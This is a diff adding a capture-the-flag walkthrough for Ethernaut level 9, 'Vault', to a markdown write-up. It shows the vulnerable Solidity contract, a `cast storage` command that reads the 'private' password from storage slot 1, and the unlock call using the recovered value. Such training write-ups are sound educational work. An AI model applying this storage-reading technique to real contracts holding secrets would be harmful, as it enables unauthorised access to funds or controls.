@@ -318,3 +318,39 @@ contract Attacker {
 And we're done! Triggering `attack()` will send Attacker contract's funds to Force contract and make us pass the level!
 
 Eighth Ethernaut level completed ✅
+
+## 9. Vault 🏦
+> Unlock the vault to pass the level!
+
+In order to pass this level, we need to trigger the `unlock()` function succesfully. It requires a password which initially we don't know:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Vault {
+  bool public locked;
+  bytes32 private password;
+
+  constructor(bytes32 _password) {
+    locked = true;
+    password = _password;
+  }
+
+  function unlock(bytes32 _password) public {
+    if (password == _password) {
+      locked = false;
+    }
+  }
+}
+```
+The password passed as parameter must be equal to the `password` variable, which is private and its value is set on the constructor. We could think that the fact that `password` variable is private won't allow us to read its value. This is not true. Any contract code deployed to the blockchain can be read/viewed by anyone. In this case, the constructor sets the password value, so even if `password` is private we'll be able to read it because of this "everything is public" blockchain characteristic.  
+
+Password is stored in storage slot 1, so in order to read its value we just need to use cast's tool to [read storage variables through the cli](https://book.getfoundry.sh/reference/cast/cast-storage). We need to pass an address, storage slot and rpc url to read the storage slot value. As easy as that!
+```javascript
+cast storage 0xDD381622461EAbba4906a767123f6460C328f806 1 --rpc-url YOUR_RPC_URL
+```
+After running the command, we see the result for the password is 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 . We can now trigger `unlock` and pass this ass parameter to unlock the contract!
+``` javascript
+await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
+```
+Nineth Ethernaut level completed ✅
